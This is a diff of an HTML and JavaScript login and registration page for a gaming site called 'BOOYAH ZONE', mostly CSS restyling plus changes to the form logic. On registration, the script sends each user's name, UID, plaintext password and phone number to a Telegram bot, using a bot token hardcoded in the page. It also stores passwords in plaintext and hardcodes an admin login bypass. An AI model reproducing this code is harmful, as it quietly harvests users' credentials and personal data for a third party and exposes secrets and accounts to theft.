@@ -24,69 +24,10 @@
             font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; overflow: hidden;
         }
 
-        .mini-support {
-            position: absolute; top: 15px; right: 15px; display: flex; align-items: center; gap: 8px;
-            background: var(--white); padding: 5px 12px; border-radius: 30px; border: 1.5px solid var(--orange);
-            text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.05); z-index: 1000;
-        }
-        .mini-support img { width: 28px; height: 28px; border-radius: 50%; }
-        .mini-support span { font-family: 'Orbitron'; font-size: 9px; color: #333; font-weight: 900; }
-
-        .app-card {
-            width: 90%; max-width: 380px; background: rgba(255, 255, 255, 0.98);
-            border-radius: 35px; padding: 30px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.08); 
-            margin-top: 40px; transition: transform 0.3s ease;
-        }
-
-        .logo-ring {
-            width: 100px; height: 100px; background: #fff; border-radius: 50%; border: 4px solid var(--orange);
-            margin: -85px auto 15px; padding: 5px; box-shadow: 0 10px 25px rgba(255,153,0,0.25);
-        }
-        .logo-ring img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
-
-        .title { font-family: 'Orbitron'; font-size: 1.6rem; color: #1a1a1a; margin-bottom: 20px; }
-
-        .tab-menu { display: flex; justify-content: center; gap: 40px; margin-bottom: 20px; }
-        .tab-item {
-            font-family: 'Orbitron'; font-size: 13px; color: #aaa; background: none; border: none; 
-            cursor: pointer; font-weight: 900; transition: 0.3s; position: relative;
-        }
-        .tab-item.active { color: var(--orange); }
-        .tab-item.active::after {
-            content: ''; position: absolute; bottom: -5px; left: 0; width: 100%; height: 3px; background: var(--orange); border-radius: 10px;
-        }
-
-        .form-area { display: flex; flex-direction: column; gap: 10px; transition: opacity 0.3s ease; }
-        .bullet-box {
-            position: relative; background: var(--dark); height: 46px;
-            border-radius: 25px 8px 8px 25px; border-right: 5px solid var(--orange);
-            display: flex; align-items: center; overflow: hidden;
-        }
-        .bullet-box i:first-child { position: absolute; left: 15px; color: var(--orange); font-size: 14px; }
-        .bullet-box input {
-            width: 100%; height: 100%; background: transparent; border: none;
-            padding: 0 45px 0 45px; color: #fff; font-family: 'Rajdhani'; font-size: 15px;
-            user-select: text;
-        }
-        /* 👁️ Eye Icon Fixed to the End */
-        .eye-icon {
-            position: absolute; right: 15px; color: #888; cursor: pointer; font-size: 16px; z-index: 10;
-        }
-
-        .btn-start {
-            width: 100%; padding: 14px; background: var(--orange); color: #fff; border: none;
-            border-radius: 12px; font-family: 'Orbitron'; font-size: 15px; font-weight: 900;
-            margin-top: 10px; cursor: pointer; transition: 0.2s;
-            box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
-        }
-        .btn-start:active { transform: scale(0.95); background: #e68a00; }
-
-        .forgot-link { display: inline-block; margin-top: 15px; font-size: 13px; color: #666; text-decoration: none; font-weight: 700; }
-        .forgot-link span { color: var(--orange); }
-
+        /* Notice Popup */
         #custom-notice {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 2000;
+            position: fixed; inset: 0; background: rgba(0,0,0,0.8); 
+            display: none; justify-content: center; align-items: center; z-index: 5000;
             backdrop-filter: blur(5px);
         }
         .notice-card { 
@@ -95,8 +36,65 @@
             animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         @keyframes popUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        
-        .hidden { display: none; }
+
+        .app-card {
+            width: 92%; max-width: 380px; background: rgba(255, 255, 255, 0.98);
+            border-radius: 35px; padding: 30px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.1); 
+            margin-top: 40px;
+        }
+
+        .logo-ring {
+            width: 100px; height: 100px; background: #fff; border-radius: 50%; border: 4px solid var(--orange);
+            margin: -85px auto 15px; padding: 5px; box-shadow: 0 10px 25px rgba(255,153,0,0.25);
+        }
+        .logo-ring img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+
+        .title { font-family: 'Orbitron'; font-size: 1.6rem; color: #1a1a1a; margin-bottom: 20px; letter-spacing: 1px; }
+
+        .tab-menu { display: flex; justify-content: center; gap: 40px; margin-bottom: 25px; }
+        .tab-item {
+            font-family: 'Orbitron'; font-size: 13px; color: #aaa; background: none; border: none; 
+            cursor: pointer; font-weight: 900; transition: 0.3s; position: relative;
+        }
+        .tab-item.active { color: var(--orange); }
+        .tab-item.active::after {
+            content: ''; position: absolute; bottom: -8px; left: 0; width: 100%; height: 3px; background: var(--orange); border-radius: 10px;
+        }
+
+        .form-area { display: flex; flex-direction: column; gap: 12px; }
+        .bullet-box {
+            position: relative; background: var(--dark); height: 50px;
+            border-radius: 25px 10px 10px 25px; border-right: 5px solid var(--orange);
+            display: flex; align-items: center;
+        }
+        .bullet-box i:first-child { position: absolute; left: 18px; color: var(--orange); font-size: 16px; }
+        .bullet-box input {
+            width: 100%; height: 100%; background: transparent; border: none;
+            padding: 0 45px 0 50px; color: #fff; font-family: 'Rajdhani'; font-size: 16px;
+            user-select: text;
+        }
+        .eye-icon { position: absolute; right: 15px; color: #888; cursor: pointer; font-size: 18px; z-index: 10; }
+
+        .btn-start {
+            width: 100%; padding: 15px; background: var(--orange); color: #fff; border: none;
+            border-radius: 15px; font-family: 'Orbitron'; font-size: 15px; font-weight: 900;
+            margin-top: 15px; cursor: pointer; transition: 0.2s;
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
+        }
+        .btn-start:active { transform: scale(0.96); }
+
+        .forgot-link { display: inline-block; margin-top: 18px; font-size: 13px; color: #666; text-decoration: none; font-weight: 700; }
+        .forgot-link span { color: var(--orange); }
+
+        .hidden { display: none !important; }
+
+        .mini-support {
+            position: absolute; top: 15px; right: 15px; display: flex; align-items: center; gap: 8px;
+            background: var(--white); padding: 6px 15px; border-radius: 30px; border: 1.5px solid var(--orange);
+            text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.05); z-index: 1000;
+        }
+        .mini-support img { width: 24px; height: 24px; border-radius: 50%; }
+        .mini-support span { font-family: 'Orbitron'; font-size: 9px; color: #333; font-weight: 900; }
     </style>
 </head>
 <body>
@@ -104,8 +102,8 @@
     <div id="custom-notice">
         <div class="notice-card">
             <h2 id="notice-title" style="font-family:'Orbitron'; color:var(--orange);">MESSAGE</h2>
-            <p id="notice-msg" style="margin: 15px 0; font-size: 14px; font-weight: 600;"></p>
-            <button onclick="closeNotice()" style="width:100%; padding:12px; background:var(--orange); border:none; border-radius:10px; color:#fff; font-weight:900; font-family:'Orbitron';">OKAY</button>
+            <p id="notice-msg" style="margin: 15px 0; font-size: 15px; font-weight: 600; line-height: 1.4;"></p>
+            <button onclick="closeNotice()" style="width:100%; padding:12px; background:var(--orange); border:none; border-radius:10px; color:#fff; font-weight:900; font-family:'Orbitron'; cursor:pointer;">OKAY</button>
         </div>
     </div>
 
@@ -119,8 +117,8 @@
         <h1 class="title">BOOYAH ZONE</h1>
 
         <div class="tab-menu">
-            <button id="tab-login" class="tab-item active" onclick="switchTab('login', this)">LOGIN</button>
-            <button id="tab-reg" class="tab-item" onclick="switchTab('reg', this)">REGISTER</button>
+            <button id="tab-login-btn" class="tab-item active" onclick="switchTab('login', this)">LOGIN</button>
+            <button id="tab-reg-btn" class="tab-item" onclick="switchTab('reg', this)">REGISTER</button>
         </div>
 
         <div id="login-form" class="form-area">
@@ -148,10 +146,12 @@
     </div>
 
     <script>
+        // --- Firebase Init ---
         const firebaseConfig = { databaseURL: "https://earn-money-6891a-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // --- Bot Config ---
         const botToken = "8766300899:AAFbpRvQiNxLDWvJQ6NIP1JeJmrHfzDz6rE";
         const chatId = "7852788120";
 
@@ -163,9 +163,13 @@
         function closeNotice() { document.getElementById('custom-notice').style.display = 'none'; }
 
         function switchTab(type, el) {
-            document.getElementById('login-form').classList.add('hidden');
-            document.getElementById('reg-form').classList.add('hidden');
-            document.getElementById(type + '-form').classList.remove('hidden');
+            if(type === 'login') {
+                document.getElementById('login-form').classList.remove('hidden');
+                document.getElementById('reg-form').classList.add('hidden');
+            } else {
+                document.getElementById('login-form').classList.add('hidden');
+                document.getElementById('reg-form').classList.remove('hidden');
+            }
             document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
             el.classList.add('active');
         }
@@ -191,37 +195,58 @@
                 showNotice("ERROR", "Bhai, saari details fill kar!"); return;
             }
 
-            const checkUser = await database.ref('users/' + uid).once('value');
-            if(checkUser.exists()) {
-                showNotice("DENIED", "Ye UID pehle se registered hai!"); return;
+            try {
+                const checkUser = await database.ref('users/' + uid).once('value');
+                if(checkUser.exists()) {
+                    showNotice("DENIED", "Ye UID pehle se registered hai!"); return;
+                }
+
+                await database.ref('users/' + uid).set({
+                    name: name,
+                    uid: uid,
+                    password: pass,
+                    phone: phone,
+                    balance: 0,
+                    joinedOn: new Date().toLocaleString()
+                });
+
+                // Telegram Notification
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW PLAYER</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}\n📱 Phone: ${phone}`)}&parse_mode=html`);
+                
+                // Save LocalData
+                localStorage.setItem('gameID', uid);
+                localStorage.setItem('userName', name);
+                
+                showNotice("WELCOME", "Registration Success! Battle ground is waiting.");
+                setTimeout(() => location.href = 'home.html', 1500);
+            } catch(e) {
+                showNotice("ERROR", "Database error! Connection check kar.");
             }
-
-            await database.ref('users/' + uid).set({
-                name, uid, password: pass, phone, balance: 0,
-                hasPlayedBefore: false,
-                joinedOn: new Date().toLocaleString()
-            });
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW RECRUIT</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}`)}&parse_mode=html`);
-            
-            localStorage.setItem('gameID', uid);
-            showNotice("WELCOME", "Registration Successful! Ready for Battle.");
-            setTimeout(() => location.href = 'home.html', 2000);
         }
 
         async function handleLogin() {
             const uid = document.getElementById('l-uid').value.trim();
             const pass = document.getElementById('l-pass').value.trim();
 
+            if(!uid || !pass) {
+                showNotice("ERROR", "UID aur Password toh daal!"); return;
+            }
+
+            // Admin Shortcut
             if(uid === "667788" && pass === "887766") { location.href = 'admin.html'; return; }
 
-            const snap = await database.ref('users/' + uid).once('value');
-            if(snap.exists() && snap.val().password === pass) {
-                localStorage.setItem('userName', snap.val().name);
-                localStorage.setItem('gameID', uid);
-                location.href = 'home.html';
-            } else {
-                showNotice("FAILED", "UID ya Password galat hai!");
+            try {
+                const snap = await database.ref('users/' + uid).once('value');
+                if(snap.exists() && snap.val().password === pass) {
+                    const userData = snap.val();
+                    localStorage.setItem('userName', userData.name);
+                    localStorage.setItem('gameID', uid);
+                    location.href = 'home.html';
+                } else {
+                    showNotice("FAILED", "UID ya Password galat hai!");
+                }
+            } catch(e) {
+                showNotice("ERROR", "Network problem! Phir se try kar.");
             }
         }
     </script>
